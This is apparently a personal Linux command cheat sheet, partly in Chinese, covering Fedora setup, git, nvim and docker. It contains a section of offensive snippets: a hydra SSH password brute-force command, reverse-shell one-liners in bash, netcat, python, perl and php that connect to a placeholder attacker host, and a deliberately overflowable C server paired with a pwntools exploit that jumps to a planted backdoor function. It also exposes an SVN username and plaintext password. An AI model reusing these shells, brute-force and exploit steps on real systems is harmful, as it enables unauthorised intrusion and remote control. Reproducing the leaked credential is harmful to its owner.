#====== unrar & rar ====== 

sudo dnf install -y https://download1.rpmfusion.org/free/fedora/rpmfusion-free-release-34.noarch.rpm
sudo dnf install -y https://download1.rpmfusion.org/nonfree/fedora/rpmfusion-nonfree-release-34.noarch.rpm
sudo dnf install -y unrar

#====== 无线网卡驱动安装 ======
unzip ../tools/Qualcomm-Atheros-QCA9377-Wifi-Linux-master.zip
# see *.doc 

#====== 获取外网的ip地址 ======
curl ipecho.net/plain
curl -s http://myip.ipip.net

#====== 端口扫描 ======
#扫描tcp指定端口
alias nctcp='nc -vz -w10'
#扫描udp指定端口
alias ncudp='nc -vzu -w10'
#用法
#nctcp ip port
#ncudp ip port

#====== svn 免密登陆 ======
- K num: key的长度
- V num: value的长度

```sh
K 15
svn:realmstring
V 65
<svn://192.168.199.199:3690> a76b6178-e184-4093-9dc7-128c5e359fa8
K 8
username
V 10
lengyangyu
K 8
passtype
V 6
simple
K 8
password
V 16
Nex7Z0aAZXlrpwJg
END

~/.subversion/auth/svn.simple/a3d387b9f7ce46307d61960657c118d8
```

#====== git快捷命令 ======
```sh
gaa
gcam
ggpush
#查看提交日志
glg
glgg
#全局修改核心编辑器--最终作用于~/.gitconfig文件
git config --global core.editor nvim
#修改提交注释并再次提交
git commit --amend
#查看全局配置
git config --global --list
#查看局部配置
git config --list
#查看远程信息
grv
#增加远程仓库
git remote add origin ssh://git@192.168.30.140:2222/ksp/ksp_web.git
#移除远程仓库
git remote remove origin
#切换到某一个分支
gsw 分支名
#获取远程所有分支
gfa
#合并分支
git merge origin/分支名
#git-svn 并基
gsr
#git-svn 上传
gsb
#代码比对
gd
git difftool -t nvimdiff
#commit 撤销操作
git reset --mixed HEAD~1 // 不删除空间改动代码，撤销commit和gaa，同时可以回退多个旧commit
git reset --soft HEAD~1  // 不删除空间改动代码，撤销commit，不撤销gaa
git reset --hard HEAD~1  // 删除空间改动代码，撤销commit，撤销gaa
#查看状态
gst
gss
gsb
#查看代码是谁修改的
在vim 中,:Git blame
```

#====== dnf 加速下载
```
/etc/dnf/dnf.conf
[main]
proxy=http://127.0.0.1:7890
```

#====== weather reporter
```
curl wttr.in
```

#======= tranlate software
```
yum install goldendict
whereis goldendict
#config directory
~/.goldendict
#goldendict is hard link
```

#====== lockfile
```
#加密
lockfile a.c b.c
#解密
lockfile a.c.bfe
```

#====== nvim 
```sh
sudo dnf install -y neovim python3-neovim
sh -c 'curl -fLo "${XDG_DATA_HOME:-$HOME/.local/share}"/nvim/site/autoload/plug.vim --create-dirs \
       https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim'
:PluginInstall
```

#====== nodejs
curl -sL https://rpm.nodesource.com/setup_12.x | sudo bash -
yum clean all 
yum makecache 
yum install -y nodejs

#====== fzf 
git clone --depth 1 https://github.com/junegunn/fzf.git ~/.fzf
~/.fzf/install

#====== fonts
```sh
https://github.com/ryanoasis/nerd-fonts/releases/download/v2.1.0/DroidSansMono.zip
mkdir ~/.local/share/fonts
auto-extract DroidSansMono.zip
mv ~/Downloads/Droid\ Sans\ Mono\ Nerd\ Font\ Complete* ~/.local/share/fonts
rm -fr DroidSansMono.zip
```

#====== supervisorctl supervisord
```sh
# control process group
#offical site 
http://supervisord.org/
```


#====== grpc_cli
```sh
#show service 
grpc_cli ls localhost:50051
#show service details
grpc_cli ls localhost:50051 helloworld.Greeter -l
#show methods
grpc_cli ls localhost:50051 helloworld.Greeter.SayHello -l
#show message type
grpc_cli type localhost:50051 helloworld.HelloRequest
#call a remote method 
grpc_cli call localhost:50051 SayHello "name: 'gRPC CLI'"
```

#-----------------------------------------------secure way
#====== password cracking
```sh 
# -l username 
# -P password dict 
# -t thread 
hydra -l root -P /root/pass.txt -t 16 192.168.110.7 ssh
```

#====== bounce shell
```sh
#-------------------bash,python,perl
#attacker
### open port 12345 and listening
nc -lvvp 12345

#target
#-------------------bash
bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1
###or
nc -e /bin/bash attacker_ip attacker_port
#-------------------python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",attacker_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
#-------------------perl
perl -e 'use Socket;$i="attacker_ip";$p=attacker_port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
#-------------------php
php -r '$sock=fsockopen("attacker_ip",attacker_port);exec("/bin/bash -i <&3 >&3 2>&3");'
```

#====== buffer overflow
##target *.cpp
```sh
#include<stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#define SERVER_PORT 12345
void backdooorr() {
system("/bin/sh -c whoami > /tmp/evil.txt");
}
int main() {
  char buf[8];
  int serverSocket;
  struct sockaddr_in server_addr;
  struct sockaddr_in clientAddr;
  int addr_len = sizeof(clientAddr);
  int client;
  char buffer[200];
  int iDataNum;
  serverSocket = socket(AF_INET, SOCK_STREAM, 0);
  bzero(&server_addr, sizeof(server_addr));
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(SERVER_PORT);
  server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
  if (bind(serverSocket, (struct sockaddr *)&server_addr, sizeof(server_addr))<0){
      return -1;
  }
  listen(serverSocket, 5);
  while (1) {
    client = accept(serverSocket, (struct sockaddr *)&clientAddr,
                    (socklen_t *)&addr_len);
    printf("%d\n",ntohs(clientAddr.sin_port));
    read(client, buf, 0x30);
    break;
  }
  return 0;
}
```
## attacker 
```sh
# get pwn way 
apt-get update
apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools

# *.py
from pwn import * 
cn=remote('192.168.120.192',12345) # 靶机部署的地址 
cn.sendline(p64(0)*3+p64(0x4011b6))
cn.interactive()
```

#===== change default editor =====
```sh 
vim ~/.zshrc 
export EDITOR=nvim 
source ~/.zshrc
```

#===== tty =====
```sh
# into tty3 tty4 tty5 tty6
ctrl-alt-[f3|f4|f5|f6]
# recover 
ctrl-alt-[f1|f2]
```

#===== write read-only file ====
#using !!
w!!
wa!!

#===== docker account ===== 
vim ~/.docker/config.json
{
	"auths": {
		"ip[:port]": {
			"auth": "base64加密"
		}
	}
}

#===== linux namespace/cgroup =====
cd /sys/fs/cgroup
cd /proc/57780/ns

#===== systemctl auto-start =====
vim /usr/lib/systemd/system/clash.service
systemctl enable clash.service

#===== recover kitty keyboard =====
kitty +kitten ssh root@192.168.120.192

#===== curl ignore cert =====
curl -k

#===== cert证书制作 =====
https://github.com/yeasy/docker_practice/blob/master/repository/registry_auth.md

#===== node control k8s =====
scp master:~/.kube/config.yaml ~/.kube

#===== screen vedio record =====
gsettings set org.gnome.settings-daemon.plugins.media-keys max-screencast-length 0
alt-ctrl-shift-r

#===== change default shell =====
chsh -s /bin/zsh
